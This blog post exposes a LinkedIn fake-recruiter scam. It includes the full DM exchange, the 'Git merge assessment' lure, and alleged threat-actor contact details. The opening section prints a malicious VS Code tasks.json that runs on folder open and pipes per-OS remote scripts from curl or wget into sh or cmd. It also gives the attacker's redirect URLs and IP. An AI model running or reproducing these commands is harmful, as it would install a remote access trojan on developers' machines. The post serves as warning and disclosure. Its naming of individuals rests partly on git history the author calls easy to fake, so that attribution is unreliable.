---
title: Omar Shrief of Trust AI Official
description: Has a pet RAT in VSCode tasks
layout: post
date: 2026-04-13 15:35 0000
time_to_live: 1800
tags: [ DM, LinkedIn, RAT, scam ]
image: assets/images/scammers/2026-04-13_Omar-Shrief-of-Trust-AI-Official/LinkedIn-Header.png
# social_comment:
#   links:
#     - text: Blue Sky
#       href:
#       title: Link to thread for this post
#
#     - text: LinkedIn
#       href:
#       title: Link to LinkedIn thread for this post
#
#     - text: Mastodon
#       href:
#       title: Link to Toot thread for this post
#
#     - text: Twitter
#       href:
#       title: Link to Tweet thread for this post
---



______


## Contents


- [TLDR][heading__tldr]
  - [Exploit hunting tricks][heading__exploit_hunting_tricks]
  - [Threat actor contact details][heading__threat_actor_contact_details]
- [DM log][heading__dm_log]
<!-- - [Got something to say about that?](#heading__social_comment) -->


______


## TLDR
[heading__tldr]: #tldr


RAT stager hidden in `.vscode/tasks.json`, as is tradition, and with oodles of
spaces between `"command":` and actual command.  Here be the relevant bits
slightly cleaned-up;

```json
{
  "...": "...",
  "tasks": [
    {
      "label": "vscode",
      "type": "shell",
      "osx": {
        "command": "curl 'https://gurucooldown.short.gy/gxUsMe8m' -L | sh"
      },
      "linux": {
        "command": "wget -qO- 'https://gurucooldown.short.gy/gxUsMe8l' -L | sh"
      },
      "windows": {
        "command": "curl https://gurucooldown.short.gy/gxUsMe8w -L | cmd"
      },
      "problemMatcher": [],
      "presentation": {
        "reveal": "never",
        "echo": false,
        "focus": false,
        "close": true,
        "panel": "dedicated",
        "showReuseMessage": false
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ]
}
```

... above URLs redirect to following;

- `https://38.92.47.167:3000/task/mac?token=40abc18736c9`
- `https://38.92.47.167:3000/task/linux?token=40abc18736c9`
- `https://38.92.47.167:3000/task/windows?token=40abc18736c9`

Running `git blame .vscode/tasks.json` shows commit `2889819a` is where the
commands were introduced.


### Exploit hunting tricks
[heading__exploit_hunting_tricks]: #exploit-hunting-tricks

VSC`*`de configurations are a common place to stash malware staging stuff;

```bash
git show main:.vscode/tasks.json 
#> ...
```

...  

```bash
git blame main .vscode/tasks.json |
  awk '/"command":/ { print $1; exit; }'
#> 2889819a
```

```bash
git log 2889819a
#> commit 2889819a80daf13e9b79490f88e3704b6c2cbdcc
#> Author: pyjong1999 <pyjong1999@gmail.com>
#> Date:   Mon Jan 19 12:48:31 2026 +0100
#>
#>     Update lib.rs
```

### Threat actor contact details
[heading__threat_actor_contact_details]: #threat-actor-contact-details

```yaml
Omar Shrief:
  linkedin:
    personal: https://www.linkedin.com/in/omar-shrief-078b71375/
  github: https://github.com/Tommy2175951
  email: alymadrid11@gmail.com
  infra: https://gurucooldown.short.gy

Yeongjong Pyo:
  AKA: pyjong1999
  email: pyjong1999@gmail.com
  github: https://github.com/Pyoyeongjong

Musharof Chowdhury:
  email: mosarrof121@gmail.com
  github: https://github.com/Musharofchy
  linkedin: https://www.linkedin.com/in/musharof/
  twitter: https://twitter.com/musharofchy
  website: https://musharof.com/

Trust AI Official:
  github: https://github.com/Trust-AI-Core
  website: https://trust-ai.io/
  twitter: https://twitter.com/TRUST_AI_
  instagram: https://www.instagram.com/trust_ai_

Neaj Morshed Imon:
  email: neajmorshedimon@gmail.com
  github:
    personal: https://github.com/neajmorshed0
    company: https://github.com/Pimjo
  facebook: https://www.facebook.com/neajmorshed0/
  linkedin: https://www.linkedin.com/in/neajmorshed/
```

**Note** `Larry Bogie` is highly likely a ne're-do-well and apart of a larger
Org that makes its business through exploitation

However, due to Git history being trivial to fake, some plausible
deniability/doubt could be cast on if any of the others listed are at all
involved.

Perusing some of the history of changes shows removal of Korean code comments,
but that too could be a red herring to obfuscate attribution further.


______


## DM log
[heading__dm_log]: #dm-log


### 2026-04-13 15:35 -- SOAndSO .eth (Digital Mercenary)

Howdy Omar!  What compels ya to connect with a strange dev like me?

### 2026-04-13 16:17 -- Omar Shrief

> Hello
>
> > (Edited)
>
> Nice to meet you here.
> I hope you are doing well.

### 2026-04-13 16:20 -- Omar Shrief

> I'm coming you because I think you’d be a great fit for us
>
>
> We’ve already launched our token and are now building the next phase of the ecosystem — including an airdrop distribution system and autonomous wallet infrastructure behind TRT Launchpad.
>
> We’re looking for a Senior Backend Engineer to architect the backend systems powering large-scale token distribution and wallet interactions.
>
> 🚀 Company: Trust AI | Web3 Launch Infrastructure ($TRT token)
>
> You would do development of:
>
> • High-performance APIs for wallet eligibility, allocation tracking, and claims
>
>  • Backend infrastructure coordinating frontend apps and smart contracts
>
>  • Systems capable of handling large-scale airdrop events and real-time claim activity
>
> You’ll own the backend architecture and work closely with the smart contract and frontend teams.
>
> 🏗️Stack: Rust, PostgreSQL / Redis, REST APIs, Web3 integrations
>
> 💰 Comp: $24k–$30k/month + token incentives
>
> 🌍 Remote: Work from anywhere
>
> 🌐 Platform: https://trust-ai.io/
>
> 🌐Company: https://x.com/TRUST_AI_
>
> If this sounds interesting, I look forward to connecting and discussing further at your convenience

### 2026-04-13 16:31 -- SOAndSO .eth (Digital Mercenary)

Doing well I am, and hope the same be true for you too!

I've done extensive work in the crypto/infra space, in fact for BoredBox I had
a blast building fast and gas efficient airdrop solutions for 'em... some of
their customers had, "is this thing on?", sorts of questions quickly
followed-up by, "oh it worked! wat? how'd that work?!", due to how efficiently
executed the code was x-]

If ya wanna talk nerdy today, then I'll have a bit of time in about 5 hours

### 2026-04-13 20:58 -- Omar Shrief

> At first, I 'll explain about our project.
>
> At a high level, we’re building a high-performance backend layer to support
> large-scale token distribution and real-time wallet interactions on Arbitrum.
>
> The main reason we’re bringing in Rust is to handle performance-critical
> parts of the system — especially where we expect high concurrency and
> low-latency requirements.
>
> Some of the core challenges we’re working on:
>
> • Handling large volumes of wallet eligibility data and allocation processing
> efficiently
>
> • Supporting high-concurrency claim events where many users interact at the
> same time
>
> • Designing low-latency services that coordinate between off-chain systems
> and on-chain transactions
>
> • Ensuring reliability and consistency under heavy load
>
> This role is less about typical CRUD APIs and more about building efficient,
> scalable systems where performance really matters.
>
> You’d have ownership over how these services are designed — including async
> architecture, data flow, and performance optimization.
>
> If you are okay, could you send me CV or resume to get started?

### 2026-04-13 22:33 -- SOAndSO .eth (Digital Mercenary)

Sounds almost too good to be true!... Because, while I can do CRUD stuff (and
will to pay the bills), building stuff that's challenging is way more fun ;-)

Attached be a reasonably up-to-date résumé, and if that ain't sufficient, then
ya can find a monstrously verbose CV which catalogs things I've worked on not
protected by NDA via the following link;

https://s0ands0.github.io/curriculum-vitae/curriculum-vitae.pdf

### 2026-04-14 15:24 -- Omar Shrief

> Okay, good.
>
> I've reviewed your CV meanwhile, and I think it stands out compared to
> others. In particular, I was very impressed by your experience at Digital
> Mercenaries LLC.
>
>
> May I ask a question?
>
> Are you familiar with git?
>
> While this role is focused on Frontend and system-level engineering, we place
> a strong emphasis on collaboration and codebase reliability, especially given
> the complexity of what we’re building.
>
> From our experience, Git workflow is not just a basic skill — it’s a critical
> part of how teams operate effectively.
>
>
> Since you'll be working in a team environment, I’d like to know—are you
> familiar with Git, particularly rebase and merge workflows? If so, which
> method do you prefer to use during development, and why?

### 2026-04-14 15:53 -- SOAndSO .eth (Digital Mercenary)

I am perhaps _too_ familiar with Git, not only at the CLI level but some of the
popular frontends (`gitweb`, GitLab, and GitHub) for it as well!

Here are publicly verifiable examples of three recent large scale team projects
I've contributed to;

- https://github.com/NixOS/nixpkgs/pulls?q=is%3Apr+author%3AS0AndS0
- https://github.com/nix-community/home-manager/pulls?q=is%3Apr+author%3AS0AndS0
- https://github.com/erlang/otp/pulls?q=is%3Apr+author%3AS0AndS0

... any preferences I may personally have, for merge vs rebase, are not
something I consider when working with a team; I use whatever the team uses so
I can focus my attentions on delivering real value

Because while each may have trade-offs; rebasing _looks_ nicer when checking
changes which can be good for onboarding but looks come at the cost of time,
where as merging is faster to ship plus preserves more of the thinking
process(es) but at cost of very noisy history. However, all that being stated
debating these trade-offs don't add real value when working on real things with
real deadlines

### 2026-04-20 17:13 -- Omar Shrief

> Hello
>
> How are you?
> > (Edited)

### 2026-04-20 21:54 -- SOAndSO .eth (Digital Mercenary)

Doing pretty good on my end!

How about you?

### 2026-04-21 06:04 -- Omar Shrief

> I'm well

### 2026-04-21 08:33 -- Omar Shrief

> Are you there?

### 2026-04-21 15:09 -- SOAndSO .eth (Digital Mercenary)

Here I am!...  Did ya wanna discuss next steps?

### 2026-04-22 17:22 -- Omar Shrief

> Yes

### 2026-04-22 17:27 -- Omar Shrief

> Based on your CV, we think that lead role is suitable for you.
>
> Could you share what qualities or skills you believe are most important for
> success in a leadership position?

### 2026-04-22 23:03 -- SOAndSO .eth (Digital Mercenary)

Accountability and discipline are two qualities I've found in quality leaders.
And some of the best leaders I've worked with ask, "what do you need?", of
teammates and never ask, "why isn't this done?", sorts of questions

The former empowers teammates where as latter encourages scapegoating

### 2026-04-23 07:28 -- Omar Shrief

> Hmm good.
>
> So right now I wanna see your leadership workflow on teamwork and After this
> step, we move into a more in-depth technical interview focused on your core
> expertise (Frontend, system design, etc.), where we can properly evaluate
> your strengths in your main field.
>
> Alright, picture yourself as a leader here. You're in charge of the main
> branch, and the members are off doing their thing on new branch. You've gotta
> rebase or merge the new branch's progress into main, ironing out those Git
> wrinkles along the way.
>
> In more details, you can see here:
>
> `https://docs.google.com/document/d/1guN-0doq1gzfToQbKHGqDLzQvNpb2W89FO5guOdd_rA`

```
                    Selective Branch Integration & Authorship Audit
                                         (Timeline: 1 hr)

Overview
This assesses your ability to manage Git conflicts within GitLens and troubleshoot a bug within the project. It emphasizes teamwork, version control proficiency.

**Context:**
We are currently reconciling two development streams: **Main** and Dev .
Both branches contain critical updates, but they have become "polluted" with experimental code.

* **Musharof Chowdhury(A)** has committed the verified production logic we need.
* **Neaj Morshed(B)** has committed experimental UI changes that are currently deprecated and must be excluded.

Because both developers worked simultaneously on the same files, a standard merge creates complex conflicts where logic and experiments are physically touching.
**Objective:**
Perform a merge of **Dev** into **Main**. Your goal is to produce a clean, functional build where **only the contributions from A are preserved** in the event of a conflict. All code authored by **B** must be identified and discarded during the resolution process.
**Technical Requirements & Workflow:**
To ensure 100% accuracy in identifying which developer wrote which line, you are required to use **GitLens**. We rely on its "Gutter Blame" and "Hover Metadata" features to audit authorship in real-time.

Step 1:Preparation

* Open the project using VS code
* Verify that the project appearance matches the provided screenshot, ensuring correct branch status and project setup using such as GitGraph.

[![update-pintmain][]]

Step 2: Mergin Dev to Main

1. **Initiate the Merge**: Merge `Dev` into `Main`.
2. **Audit Conflicts**: For every merge conflict, use the **GitLens authorship annotations** to verify the origin of the code blocks.
3. **Resolve by Author**:
   1. Accept changes where the metadata confirms **A** as the author.
   2. Reject/Revert changes where the metadata confirms **B** as the author.
4. **Final Validation**: Use the GitLens "File History" view to provide a final confirmation that no lines from **B** remain in the resolved files.

**Deliverables**

* Merged code: Provide the full PR number for the merge/rebase.
* Screenshots: Please include clear screenshots on gitgraph


**Target example:**

[![commit-graph][]]
```

> Please let me know when you are ready, and so i 'll invite you.
>
> Drop here that when you are available to do that? so I 'll invite you.

```
#### Editor's note -- Oof the slop slops thick in their G-Docs!

Not sure if it is worth my time to clean-up for better presentation, because
currently I'm battling with Jekyll and GitHub Pages being broken; both locally
via Docker and remotely via GitHub Actions :-|
```

### 2026-04-23 15:31 -- SOAndSO .eth (Digital Mercenary)

Hmm, without a Git repo it is difficult to assess the state of commit history
and most effective route for resolving conflicts

But, provided work ya request I do is paid work I've no issue consulting
strategies for current task, as well as possible patterns to mitigate future
messy merges. What's your budget?

### 2026-04-23 16:13 -- Omar Shrief

> This is unpaid work, and I'll invite you to our git repo for this technical assessment

### 2026-04-23 16:21 -- SOAndSO .eth (Digital Mercenary) 

Without a Git repo it is difficult to assess the state of commit history and
most effective route for resolving conflicts. But provided work ya request I do
is paid work I've no issue consulting strategies for current task, as well as
possible patterns to mitigate future messy merges. What's your budget?

**Edit** Oh and before I forget here be the publicly published professional
policy detailing services I'm allowed to offer for unpaid work →
https://www.digital-mercenaries.com/frequently-asked-questions.html#do-you-offer-free-services-such-as-bug-testing-or-code-reviews

### 2026-04-23 16:30 -- Omar Shrief

> Okay, understand.
>
> I've just invited you to our git repo for technical assessment.
> 
> This is just only one step for our hiring process.
>
> And then we 'll have a interview for your major field. 
> 
> ""Edit"" we'll  only  pay as a salary to our employee, and not candidate.
> hope for your understand.


### 2026-04-23 17:11 -- SOAndSO .eth (Digital Mercenary)

How do you expect me to do that?

### 2026-04-23 17:21 -- Omar Shrief

About that, we've added on description

### 2026-04-23 18:03 -- SOAndSO .eth (Digital Mercenary)

I see the screenshot, but again, how do you expect me to do that?



[update-pintmain][/assets/images/scammers/2026-04-13_Omar-Shrief-of-Trust-AI-Official/2026-04-23_Google-Docs-attachment_update-pintmain.png]
[commit-graph][/assets/images/scammers/2026-04-13_Omar-Shrief-of-Trust-AI-Official/2026-04-23_Google-Docs-attachment_commit-graph.png]
[update-pintmain][/assets/images/scammers/2026-04-13_Omar-Shrief-of-Trust-AI-Official/2026-04-23_Google-Docs-attachment_screenshot-001.png]
